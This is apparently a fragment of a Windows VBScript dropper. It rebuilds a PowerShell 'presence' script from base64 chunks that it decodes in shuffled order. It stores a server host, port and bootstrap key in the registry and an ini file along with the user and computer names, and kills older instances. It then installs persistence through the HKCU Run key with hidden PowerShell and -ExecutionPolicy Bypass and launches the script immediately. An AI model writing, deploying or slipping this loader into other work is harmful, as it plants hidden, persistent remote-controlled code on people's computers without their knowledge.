Function PayloadSlot(n)
  Select Case n
    Case 0: PayloadSlot = PayloadSlot_0()
    Case 1: PayloadSlot = PayloadSlot_1()
    Case 2: PayloadSlot = PayloadSlot_2()
    Case 3: PayloadSlot = PayloadSlot_3()
    Case 4: PayloadSlot = PayloadSlot_4()
    Case Else: PayloadSlot = ""
  End Select
End Function

Function UnlockPresenceScript()
  Dim stream, idx, part, bytes
  Set stream = CreateObject("ADODB.Stream")
  stream.Type = 1
  stream.Open
  idx = 1
  part = PayloadSlot(idx)
  bytes = DecodeBase64Bytes(part)
  If Not IsArray(bytes) Then
    Err.Raise 5, "UnlockPresenceScript", "bad payload slot " & idx
  End If
  stream.Write bytes
  idx = 4
  part = PayloadSlot(idx)
  bytes = DecodeBase64Bytes(part)
  If Not IsArray(bytes) Then
    Err.Raise 5, "UnlockPresenceScript", "bad payload slot " & idx
  End If
  stream.Write bytes
  idx = 0
  part = PayloadSlot(idx)
  bytes = DecodeBase64Bytes(part)
  If Not IsArray(bytes) Then
    Err.Raise 5, "UnlockPresenceScript", "bad payload slot " & idx
  End If
  stream.Write bytes
  idx = 3
  part = PayloadSlot(idx)
  bytes = DecodeBase64Bytes(part)
  If Not IsArray(bytes) Then
    Err.Raise 5, "UnlockPresenceScript", "bad payload slot " & idx
  End If
  stream.Write bytes
  idx = 2
  part = PayloadSlot(idx)
  bytes = DecodeBase64Bytes(part)
  If Not IsArray(bytes) Then
    Err.Raise 5, "UnlockPresenceScript", "bad payload slot " & idx
  End If
  stream.Write bytes
  stream.Position = 0
  UnlockPresenceScript = Utf8BytesToString(StreamReadAll(stream))
End Function

Function StreamReadAll(st)
  StreamReadAll = st.Read
End Function

Function DecodeBase64Bytes(b64s)
  Dim xml, node
  On Error Resume Next
  Set xml = CreateObject("MSXML2.DOMDocument.6.0")
  Set node = xml.createElement("b64")
  node.dataType = "bin.base64"
  node.text = b64s
  DecodeBase64Bytes = node.nodeTypedValue
  If IsArray(DecodeBase64Bytes) Then Exit Function
  Set xml = CreateObject("Microsoft.XMLDOM")
  Set node = xml.createElement("b64")
  node.dataType = "bin.base64"
  node.text = b64s
  DecodeBase64Bytes = node.nodeTypedValue
  On Error GoTo 0
End Function

Function Utf8BytesToString(bytes)
  Dim stream
  Set stream = CreateObject("ADODB.Stream")
  stream.Type = 1
  stream.Open
  stream.Write bytes
  stream.Position = 0
  stream.Type = 2
  stream.Charset = "utf-8"
  Utf8BytesToString = stream.ReadText
  stream.Close
End Function

Sub WriteAllText(path, body)
  Dim stream
  If IsNull(body) Or Len(body) < 256 Then
    Err.Raise 5, "WriteAllText", "presence script too short or empty"
  End If
  Set stream = CreateObject("ADODB.Stream")
  stream.Type = 2
  stream.Charset = "utf-8"
  stream.Open
  stream.WriteText body
  stream.Position = 0
  stream.SaveToFile path, 2
  stream.Close
End Sub

Sub WriteSettings()
  Dim base, userName, hostName, iniPath, iniBody
  base = "HKCU\Software\AbeOffice\Agent\"
  iniPath = officeHome & "\abe_bootstrap.ini"
  On Error Resume Next
  userName = sh.ExpandEnvironmentStrings("%USERNAME%")
  hostName = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
  sh.RegWrite base & "Host", SERVER_HOST, "REG_SZ"
  sh.RegWrite base & "Port", SERVER_PORT, "REG_SZ"
  sh.RegWrite base & "Key", BOOTSTRAP_KEY, "REG_SZ"
  sh.RegWrite base & "Device", hostName, "REG_SZ"
  sh.RegWrite base & "User", userName, "REG_SZ"
  sh.RegWrite base & "Mode", "ps-stub", "REG_SZ"
  sh.RegWrite base & "Presence", ps1Path, "REG_SZ"
  sh.RegWrite base & "Office", officeHome, "REG_SZ"
  iniBody = "Host=" & SERVER_HOST & vbCrLf & "Port=" & SERVER_PORT & vbCrLf & "Key=" & BOOTSTRAP_KEY & vbCrLf
  WriteAllText iniPath, iniBody
  On Error GoTo 0
End Sub

Sub StopOldPresence()
  Dim cmd
  On Error Resume Next
  cmd = "powershell.exe -NoProfile -WindowStyle Hidden -Command ""Get-CimInstance Win32_Process -Filter """"name='powershell.exe'"""" | Where-Object { $_.CommandLine -match 'abe_presence\.ps1' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }"""
  sh.Run cmd, 0, True
  WScript.Sleep 800
  On Error GoTo 0
End Sub

Sub InstallPersistence(ps1)
  On Error Resume Next
  sh.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Abe Office Agent"
  sh.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\" & RUN_VALUE
  On Error GoTo 0
  runCmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & ps1 & """"
  sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\" & RUN_VALUE, runCmd, "REG_SZ"
End Sub

Sub StartPresenceNow(ps1)
  sh.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & ps1 & """", 0, False
End Sub

